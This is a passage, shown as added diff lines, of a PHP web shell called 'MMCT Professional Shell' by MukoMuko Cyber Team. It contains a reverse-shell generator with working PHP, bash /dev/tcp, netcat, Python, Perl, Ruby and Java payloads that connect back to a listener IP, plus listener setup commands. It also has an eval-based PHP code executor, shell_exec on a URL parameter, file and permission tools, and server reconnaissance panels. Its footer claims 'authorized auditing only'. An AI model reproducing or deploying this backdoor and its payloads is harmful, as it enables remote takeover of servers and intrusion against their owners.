+                                        <input type="text" class="form-control form-control-custom" 
+                                               id="listenerIP" value="<?php echo $system_info['client_ip']; ?>" required>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="form-label">Listener Port</label>
+                                        <input type="number" class="form-control form-control-custom" 
+                                               id="listenerPort" value="4444" min="1" max="65535" required>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="form-label">Shell Type</label>
+                                        <select class="form-select form-control-custom" id="shellType">
+                                            <option value="php">PHP Reverse Shell</option>
+                                            <option value="bash">Bash Reverse Shell</option>
+                                            <option value="nc">Netcat Reverse Shell</option>
+                                            <option value="python">Python Reverse Shell</option>
+                                            <option value="perl">Perl Reverse Shell</option>
+                                            <option value="ruby">Ruby Reverse Shell</option>
+                                            <option value="java">Java Reverse Shell</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="d-grid">
+                                        <button type="button" class="btn btn-custom" onclick="generateReverseShell()">
+                                            <i class="fas fa-code me-2"></i>Generate Shell Code
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="stat-card h-100">
+                                <h4><i class="fas fa-plug me-2"></i>Generated Shell Code</h4>
+                                <p class="text-muted small">Copy this code to the target system</p>
+                                
+                                <div class="mb-3">
+                                    <div class="d-flex justify-content-between mb-2">
+                                        <span>Shell Output:</span>
+                                        <button class="btn btn-sm btn-outline-info" onclick="copyToClipboard()">
+                                            <i class="fas fa-copy me-1"></i>Copy
+                                        </button>
+                                    </div>
+                                    <textarea id="shellOutput" class="form-control form-control-custom code-block" 
+                                              rows="10" readonly style="font-family: 'Courier New', monospace;"></textarea>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label class="form-label">Quick Download</label>
+                                    <div class="d-grid gap-2">
+                                        <button class="btn btn-outline-success" onclick="downloadShell('php')">
+                                            <i class="fas fa-download me-2"></i>Download as PHP File
+                                        </button>
+                                        <button class="btn btn-outline-warning" onclick="downloadShell('txt')">
+                                            <i class="fas fa-file-download me-2"></i>Download as Text File
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row mt-4">
+                        <div class="col-12">
+                            <div class="stat-card">
+                                <h4><i class="fas fa-network-wired me-2"></i>Listener Setup Guide</h4>
+                                <div class="row">
+                                    <div class="col-md-4">
+                                        <h6><i class="fas fa-terminal text-success me-2"></i>Netcat Listener</h6>
+                                        <div class="code-block small">
+                                            nc -lvnp <span id="ncPort">4444</span>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <h6><i class="fab fa-python text-warning me-2"></i>Python Listener</h6>
+                                        <div class="code-block small">
+                                            python -c 'import socket,subprocess,os;<br>
+                                            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>
+                                            s.bind(("0.0.0.0",<span id="pyPort">4444</span>));<br>
+                                            s.listen(1);conn,addr=s.accept();'
+                                        </div>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <h6><i class="fas fa-power-off text-danger me-2"></i>PowerShell Listener</h6>
+                                        <div class="code-block small">
+                                            $listener = New-Object System.Net.Sockets.TcpListener<br>
+                                            ([System.Net.IPAddress]::Any,<span id="psPort">4444</span>);<br>
+                                            $listener.Start();
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- System Info Tab -->
+            <div class="tab-pane fade" id="system" role="tabpanel">
+                <div class="glass-card p-4">
+                    <h4><i class="fas fa-server me-2"></i>System Information</h4>
+                    
+                    <div class="row mt-4">
+                        <div class="col-md-6">
+                            <div class="stat-card">
+                                <h5><i class="fas fa-desktop me-2"></i>Operating System</h5>
+                                <table class="table table-sm table-borderless">
+                                    <tr>
+                                        <td width="40%"><strong>System:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['os']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Server IP:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['server_ip']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Server Software:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['server_software']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Document Root:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['document_root']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Server Admin:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['server_admin']); ?></td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="stat-card">
+                                <h5><i class="fas fa-code me-2"></i>PHP Configuration</h5>
+                                <table class="table table-sm table-borderless">
+                                    <tr>
+                                        <td width="40%"><strong>PHP Version:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['php_version']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Memory Limit:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['memory_limit']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Max Execution Time:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['max_execution_time']); ?> seconds</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Loaded Extensions:</strong></td>
+                                        <td>
+                                            <?php 
+                                            $extensions = $system_info['loaded_extensions'];
+                                            echo '<div style="max-height: 100px; overflow-y: auto;">';
+                                            foreach(array_chunk($extensions, 5) as $chunk) {
+                                                echo implode(', ', $chunk) . '<br>';
+                                            }
+                                            echo '</div>';
+                                            ?>
+                                        </td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row mt-4">
+                        <div class="col-md-6">
+                            <div class="stat-card">
+                                <h5><i class="fas fa-network-wired me-2"></i>Network Information</h5>
+                                <table class="table table-sm table-borderless">
+                                    <tr>
+                                        <td width="40%"><strong>Client IP:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['client_ip']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Web Host:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['web_host']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Script Path:</strong></td>
+                                        <td><?php echo htmlspecialchars($system_info['script_path']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>User Agent:</strong></td>
+                                        <td><?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'N/A'); ?></td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="stat-card">
+                                <h5><i class="fas fa-hdd me-2"></i>Disk & Memory</h5>
+                                <table class="table table-sm table-borderless">
+                                    <tr>
+                                        <td width="40%"><strong>Total Disk Space:</strong></td>
+                                        <td><?php echo formatBytes($system_info['disk_total']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Free Disk Space:</strong></td>
+                                        <td><?php echo formatBytes($system_info['disk_free']); ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Used Disk Space:</strong></td>
+                                        <td>
+                                            <?php 
+                                            $used = $system_info['disk_total'] - $system_info['disk_free'];
+                                            echo formatBytes($used) . ' (' . 
+                                                 number_format(($used / $system_info['disk_total']) * 100, 2) . '%)';
+                                            ?>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Memory Usage:</strong></td>
+                                        <td>
+                                            <?php 
+                                            $memory_usage = memory_get_usage(true);
+                                            $memory_peak = memory_get_peak_usage(true);
+                                            echo formatBytes($memory_usage) . ' / ' . formatBytes($memory_peak) . ' (peak)';
+                                            ?>
+                                        </td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <div class="stat-card">
+                            <h5><i class="fas fa-chart-bar me-2"></i>System Health Monitor</h5>
+                            <div class="row">
+                                <div class="col-md-4">
+                                    <h6>CPU Load (Simulated)</h6>
+                                    <div class="progress" style="height: 20px;">
+                                        <div class="progress-bar progress-bar-custom" role="progressbar" 
+                                             style="width: <?php echo rand(20, 80); ?>%">
+                                            <?php echo rand(20, 80); ?>%
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-4">
+                                    <h6>Memory Usage</h6>
+                                    <div class="progress" style="height: 20px;">
+                                        <div class="progress-bar progress-bar-custom" role="progressbar" 
+                                             style="width: <?php echo ($memory_usage / $memory_peak) * 100; ?>%">
+                                            <?php echo number_format(($memory_usage / $memory_peak) * 100, 1); ?>%
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-4">
+                                    <h6>Disk Usage</h6>
+                                    <div class="progress" style="height: 20px;">
+                                        <div class="progress-bar progress-bar-custom" role="progressbar" 
+                                             style="width: <?php echo (($system_info['disk_total'] - $system_info['disk_free']) / $system_info['disk_total']) * 100; ?>%">
+                                            <?php echo number_format((($system_info['disk_total'] - $system_info['disk_free']) / $system_info['disk_total']) * 100, 1); ?>%
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Advanced Tools Tab -->
+            <div class="tab-pane fade" id="tools" role="tabpanel">
+                <div class="glass-card p-4">
+                    <h4><i class="fas fa-tools me-2"></i>Advanced Tools</h4>
+                    
+                    <div class="row mt-4">
+                        <div class="col-md-4 mb-3">
+                            <div class="stat-card h-100">
+                                <h5><i class="fas fa-terminal me-2"></i>PHP Code Executor</h5>
+                                <form method="POST">
+                                    <div class="mb-3">
+                                        <label class="form-label">PHP Code</label>
+                                        <textarea name="phpcode" class="form-control form-control-custom" rows="5"><?php echo '<?php echo "Hello from MMCT Shell"; ?>'; ?></textarea>
+                                    </div>
+                                    <button type="submit" name="execute_php" class="btn btn-custom w-100">
+                                        <i class="fas fa-play me-2"></i>Execute PHP
+                                    </button>
+                                </form>
+                                <?php
+                                if(isset($_POST['execute_php']) && isset($_POST['phpcode'])) {
+                                    ob_start();
+                                    eval('?>' . $_POST['phpcode']);
+                                    $output = ob_get_clean();
+                                    echo '<div class="mt-3">
+                                            <label>Output:</label>
+                                            <div class="code-block">' . htmlspecialchars($output) . '</div>
+                                          </div>';
+                                }
+                                ?>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-4 mb-3">
+                            <div class="stat-card h-100">
+                                <h5><i class="fas fa-database me-2"></i>Database Manager</h5>
+                                <form method="POST">
+                                    <div class="mb-3">
+                                        <label class="form-label">SQL Query</label>
+                                        <textarea name="sqlquery" class="form-control form-control-custom" rows="5">SHOW DATABASES;</textarea>
+                                    </div>
+                                    <div class="row g-2 mb-3">
+                                        <div class="col-6">
+                                            <input type="text" name="dbhost" class="form-control form-control-custom" 
+                                                   placeholder="Host" value="localhost">
+                                        </div>
+                                        <div class="col-6">
+                                            <input type="text" name="dbuser" class="form-control form-control-custom" 
+                                                   placeholder="Username">
+                                        </div>
+                                        <div class="col-6">
+                                            <input type="password" name="dbpass" class="form-control form-control-custom" 
+                                                   placeholder="Password">
+                                        </div>
+                                        <div class="col-6">
+                                            <input type="text" name="dbname" class="form-control form-control-custom" 
+                                                   placeholder="Database">
+                                        </div>
+                                    </div>
+                                    <button type="submit" name="execute_sql" class="btn btn-custom w-100">
+                                        <i class="fas fa-bolt me-2"></i>Execute SQL
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-4 mb-3">
+                            <div class="stat-card h-100">
+                                <h5><i class="fas fa-cogs me-2"></i>System Commands</h5>
+                                <div class="d-grid gap-2">
+                                    <a href="?cmd=whoami" class="btn btn-outline-info text-start">
+                                        <i class="fas fa-user me-2"></i>Show Current User
+                                    </a>
+                                    <a href="?cmd=id" class="btn btn-outline-info text-start">
+                                        <i class="fas fa-id-card me-2"></i>Show User ID
+                                    </a>
+                                    <a href="?cmd=ls -la" class="btn btn-outline-info text-start">
+                                        <i class="fas fa-list me-2"></i>List Directory
+                                    </a>
+                                    <a href="?cmd=df -h" class="btn btn-outline-info text-start">
+                                        <i class="fas fa-hdd me-2"></i>Disk Usage
+                                    </a>
+                                    <a href="?cmd=ps aux" class="btn btn-outline-info text-start">
+                                        <i class="fas fa-tasks me-2"></i>Running Processes
+                                    </a>
+                                    <a href="?cmd=netstat -tulpn" class="btn btn-outline-info text-start">
+                                        <i class="fas fa-network-wired me-2"></i>Network Connections
+                                    </a>
+                                </div>
+                                <?php
+                                if(isset($_GET['cmd'])) {
+                                    echo '<div class="mt-3">
+                                            <label>Command Output:</label>
+                                            <div class="code-block">' . 
+                                            htmlspecialchars(shell_exec($_GET['cmd'])) . 
+                                            '</div>
+                                          </div>';
+                                }
+                                ?>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row mt-4">
+                        <div class="col-12">
+                            <div class="stat-card">
+                                <h5><i class="fas fa-file-archive me-2"></i>File Operations</h5>
+                                <div class="row">
+                                    <div class="col-md-3">
+                                        <form method="POST" onsubmit="return confirm('Create new directory?')">
+                                            <div class="mb-3">
+                                                <label class="form-label">New Directory Name</label>
+                                                <input type="text" name="dirname" class="form-control form-control-custom" 
+                                                       placeholder="folder_name" required>
+                                            </div>
+                                            <button type="submit" name="create_dir" class="btn btn-outline-success w-100">
+                                                <i class="fas fa-folder-plus me-2"></i>Create Directory
+                                            </button>
+                                        </form>
+                                    </div>
+                                    <div class="col-md-3">
+                                        <form method="POST" onsubmit="return confirm('Create new file?')">
+                                            <div class="mb-3">
+                                                <label class="form-label">New File Name</label>
+                                                <input type="text" name="filename" class="form-control form-control-custom" 
+                                                       placeholder="file.php" required>
+                                            </div>
+                                            <button type="submit" name="create_file" class="btn btn-outline-primary w-100">
+                                                <i class="fas fa-file-plus me-2"></i>Create File
+                                            </button>
+                                        </form>
+                                    </div>
+                                    <div class="col-md-3">
+                                        <form method="POST">
+                                            <div class="mb-3">
+                                                <label class="form-label">Change Permissions</label>
+                                                <input type="text" name="chmod_path" class="form-control form-control-custom" 
+                                                       placeholder="/path/to/file" required>
+                                                <input type="text" name="chmod_value" class="form-control form-control-custom mt-2" 
+                                                       placeholder="0755" required>
+                                            </div>
+                                            <button type="submit" name="change_perms" class="btn btn-outline-warning w-100">
+                                                <i class="fas fa-key me-2"></i>Change Perms
+                                            </button>
+                                        </form>
+                                    </div>
+                                    <div class="col-md-3">
+                                        <form method="POST" onsubmit="return confirm('Search in files?')">
+                                            <div class="mb-3">
+                                                <label class="form-label">Search Files</label>
+                                                <input type="text" name="search_term" class="form-control form-control-custom" 
+                                                       placeholder="search term" required>
+                                            </div>
+                                            <button type="submit" name="search_files" class="btn btn-outline-info w-100">
+                                                <i class="fas fa-search me-2"></i>Search Files
+                                            </button>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="mt-5 text-center text-muted">
+            <hr class="border-secondary">
+            <p>
+                <i class="fas fa-shield-alt me-1"></i> MMCT Professional Shell v3.3 | 
+                SHA256 Encrypted Authentication | 
+                <span id="sessionTimer"></span>
+            </p>
+            <p class="small">
+                &copy; 2024 MukoMuko Cyber Team | SonySec07 | 
+                <span class="text-warning">For Authorized Security Auditing Only</span>
+            </p>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Live Clock
+        function updateClock() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString();
+            const dateString = now.toLocaleDateString();
+            document.getElementById('liveClock').textContent = `${dateString} ${timeString}`;
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // Session Timer
+        let sessionTime = 1800; // 30 minutes in seconds
+        function updateSessionTimer() {
+            const minutes = Math.floor(sessionTime / 60);
+            const seconds = sessionTime % 60;
+            document.getElementById('sessionTimer').textContent = 
+                `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (sessionTime <= 0) {
+                alert('Session expired. Please login again.');
+                window.location.reload();
+            } else {
+                sessionTime--;
+            }
+        }
+        setInterval(updateSessionTimer, 1000);
+        updateSessionTimer();
+
+        // Reverse Shell Generator
+        function generateReverseShell() {
+            const ip = document.getElementById('listenerIP').value;
+            const port = document.getElementById('listenerPort').value;
+            const type = document.getElementById('shellType').value;
+            
+            // Update listener examples
+            document.getElementById('ncPort').textContent = port;
+            document.getElementById('pyPort').textContent = port;
+            document.getElementById('psPort').textContent = port;
+            
+            let shellCode = '';
+            
+            switch(type) {
+                case 'php':
+                    shellCode = `<?php
+// PHP Reverse Shell - MMCT Professional Edition
+set_time_limit(0);
+\$ip = '${ip}';
+\$port = ${port};
+\$chunk_size = 1400;
+\$write_a = null;
+\$error_a = null;
+\$shell = 'uname -a; w; id; /bin/sh -i';
+\$daemon = 0;
+\$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+    \$pid = pcntl_fork();
+    if (\$pid == -1) {
+        printit("ERROR: Can't fork");
+        exit(1);
+    }
+    if (\$pid) {
+        exit(0);
+    }
+    if (posix_setsid() == -1) {
+        printit("Error: Can't setsid()");
+        exit(1);
+    }
+    \$daemon = 1;
+} else {
+    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
+}
+
+chdir("/");
+umask(0);
+
+\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
+if (!\$sock) {
+    printit("\$errstr (\$errno)");
+    exit(1);
+}
+
+\$descriptorspec = array(
+    0 => array("pipe", "r"),
+    1 => array("pipe", "w"),
+    2 => array("pipe", "w")
+);
+
+\$process = proc_open(\$shell, \$descriptorspec, \$pipes);
+if (!is_resource(\$process)) {
+    printit("ERROR: Can't spawn shell");
+    exit(1);
+}
+
+stream_set_blocking(\$pipes[0], 0);
+stream_set_blocking(\$pipes[1], 0);
+stream_set_blocking(\$pipes[2], 0);
+stream_set_blocking(\$sock, 0);
+
+printit("Successfully opened reverse shell to \$ip:\$port");
+
+while (1) {
+    if (feof(\$sock)) {
+        printit("ERROR: Shell connection terminated");
+        break;
+    }
+    if (feof(\$pipes[1])) {
+        printit("ERROR: Shell process terminated");
+        break;
+    }
+
+    \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
+    \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);
+
+    if (in_array(\$sock, \$read_a)) {
+        \$input = fread(\$sock, \$chunk_size);
+        fwrite(\$pipes[0], \$input);
+    }
+
+    if (in_array(\$pipes[1], \$read_a)) {
+        \$input = fread(\$pipes[1], \$chunk_size);
+        fwrite(\$sock, \$input);
+    }
+
+    if (in_array(\$pipes[2], \$read_a)) {
+        \$input = fread(\$pipes[2], \$chunk_size);
+        fwrite(\$sock, \$input);
+    }
+}
+
+fclose(\$sock);
+fclose(\$pipes[0]);
+fclose(\$pipes[1]);
+fclose(\$pipes[2]);
+proc_close(\$process);
+
+function printit(\$string) {
+    if (!\$debug) return;
+    \$data = "\$string\\n";
+    fwrite(STDERR, \$data);
+}
+?>`;
+                    break;
+                    
+                case 'bash':
+                    shellCode = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+                    break;
+                    
+                case 'nc':
+                    shellCode = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
+                    break;
+                    
+                case 'python':
+                    shellCode = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
+                    break;
+                    
+                case 'perl':
+                    shellCode = `perl -e 'use Socket;\$i="${ip}";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
+                    break;
+                    
+                case 'ruby':
+                    shellCode = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
+                    break;
+                    
+                case 'java':
+                    shellCode = `// Java Reverse Shell
+// Compile: javac ReverseShell.java
+// Run: java ReverseShell ${ip} ${port}
+
+import java.io.*;
+import java.net.*;
+
+public class ReverseShell {
+    public static void main(String[] args) throws Exception {
+        String host = "${ip}";
+        int port = ${port};
+        String cmd = "/bin/sh";
+        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s = new Socket(host, port);
+        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+        while(!s.isClosed()) {
+            while(pi.available() > 0) so.write(pi.read());
+            while(pe.available() > 0) so.write(pe.read());
+            while(si.available() > 0) po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try { p.exitValue(); break; } catch (Exception e) {}
+        }
+        p.destroy();
+        s.close();
+    }
+}`;
+                    break;
+            }
+            
+            document.getElementById('shellOutput').value = shellCode;
+        }
+
+        // Copy to Clipboard
+        function copyToClipboard() {
+            const textarea = document.getElementById('shellOutput');
+            textarea.select();
+            document.execCommand('copy');
+            alert('Shell code copied to clipboard!');
+        }
+
+        // Download Shell
+        function downloadShell(type) {
+            const content = document.getElementById('shellOutput').value;
+            const ip = document.getElementById('listenerIP').value;
+            const port = document.getElementById('listenerPort').value;
+            const shellType = document.getElementById('shellType').value;
+            
+            let filename = `reverse_shell_${ip}_${port}`;
+            let mimeType = 'text/plain';
+            
+            if (type === 'php') {
+                filename += '.php';
+                mimeType = 'application/x-php';
+            } else {
+                filename += '.txt';
+            }
+            
+            const blob = new Blob([content], { type: mimeType });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Run Full Scan
+        function runFullScan() {
+            if (confirm('Run full system scan? This may take several minutes.')) {
+                alert('Full scan initiated. Check the Security Audit tab for results.');
+                window.location.href = '?scan=deep&path=/';
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Generate default reverse shell
+            generateReverseShell();
+            
+            // Set active tab from URL hash
+            const hash = window.location.hash.substring(1);
+            if (hash) {
+                const tab = new bootstrap.Tab(document.getElementById(hash + '-tab'));
+                tab.show();
+            }
+            
+            // Auto-refresh file list every 30 seconds
+            setInterval(() => {
+                if (document.getElementById('file-tab').classList.contains('active')) {
+                    window.location.reload();
+                }
+            }, 30000);
+        });
+    </script>
+</body>
+</html>
+
+<?php
+// Helper Functions
+function perms($file) {
+    if (!file_exists($file)) return '--------';
+    
+    $perms = fileperms($file);
+    if (($perms & 0xC000) == 0xC000) $info = 's';
+    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
+    elseif (($perms & 0x8000) == 0x8000) $info = '-';
+    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
+    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
+    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
+    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
+    else $info = 'u';
+
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+function formatBytes($bytes, $precision = 2) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= pow(1024, $pow);
+    return round($bytes, $precision) . ' ' . $units[$pow];
+}
